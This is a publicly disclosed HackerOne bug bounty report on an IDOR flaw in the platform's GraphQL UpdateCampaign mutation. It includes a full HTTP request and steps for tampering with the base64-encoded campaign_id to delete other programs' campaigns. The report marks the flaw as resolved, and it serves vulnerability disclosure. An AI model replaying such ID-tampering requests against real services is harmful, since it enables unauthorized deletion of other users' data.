---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/insecure-direct-object-reference-idor
  - env/web
substate: "resolved"
weakness: "Insecure Direct Object Reference (IDOR)"
enriched: true
body: true
date: 2023-05-03
submitted: 2023-05-02T03:56:11.772Z
bounty_usd: null
votes: 346
cve: []
program: "[[programs/security|HackerOne]]"
reporter: "datph4m"
source: "https://hackerone.com/reports/1969141"
title: "Insecure Direct Object Reference (IDOR) - Delete Campaigns  "
---
# Insecure Direct Object Reference (IDOR) - Delete Campaigns  

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 346 | **Program:** HackerOne | **Disclosed:** 2023-05-03

- Report: [https://hackerone.com/reports/1969141](https://hackerone.com/reports/1969141)
- CWE: Insecure Direct Object Reference (IDOR)
- Submitted: 2023-05-02T03:56:11.772Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

**Summary:**
Hi Team, 

I think I can delete any Campaigns based on campaign_id


### Steps To Reproduce

Follow the POST request below

````
POST /graphql HTTP/2
Host: hackerone.com
Cookie: yourcookie
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://hackerone.com/organizations/opensea_demo/campaigns/242/edit
Content-Type: application/json
X-Csrf-Token: ███
X-Product-Area: campaigns
X-Product-Feature: edit
X-Datadog-Origin: rum
X-Datadog-Parent-Id: 9027318766950450042
X-Datadog-Sampling-Priority: 1
X-Datadog-Trace-Id: 87799383677632658
Content-Length: 851
Origin: https://hackerone.com
Dnt: 1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

{"operationName":"UpdateCampaign","variables":{"product_area":"campaigns","product_feature":"edit","input":{"campaign_id":"Z2lkOi8vaGFja2Vyb25lL0NhbXBhaWduLzI0NA==","team_id":"Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzU3MzI4","bounty_table_row_id":"Z2lkOi8vaGFja2Vyb25lL0JvdW50eVRhYmxlUm93LzEwODM2","start_date":"2023-05-05T09:00:00Z","end_date":"2023-05-08T05:00:00Z","critical":3,"high":2,"medium":1.5,"low":1.5,"structured_scope_ids":[],"researchers_information":"ccccccccccccccc"}},"query":"mutation UpdateCampaign($input: UpdateCampaignInput!) {\n  updateCampaign(input: $input) {\n    was_successful\n    errors {\n      edges {\n        node {\n          id\n          type\n          field\n          message\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"}

````

Decode base64 of campaign_id to get **gid://hackerone/Campaign/244**

Increase or decrease the number after Campaign and re-encode it with base64

At the campaign_id parameter in the request change it to another program's ongoing campaign_id parameter.

Then send Campaign request of any program to be deleted.

## Impact

Can delete all Campaign on hackerone or any program

## Timeline

- **Report Filed**
- **Report Severity Updated**
- **2023-05-02** @datph4m: POC : 

█████
- **Report Severity Updated**
- **Report Triaged**
- **Bounty Awarded**
- **Report Retesting**
- **User Completed Retest**
- **Report Retest Approved**
- **Report Resolved**
- **2023-05-03** @hendrik_hv01h: Thanks again for bringing this to our attention :)
Looking forward to your next report!
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
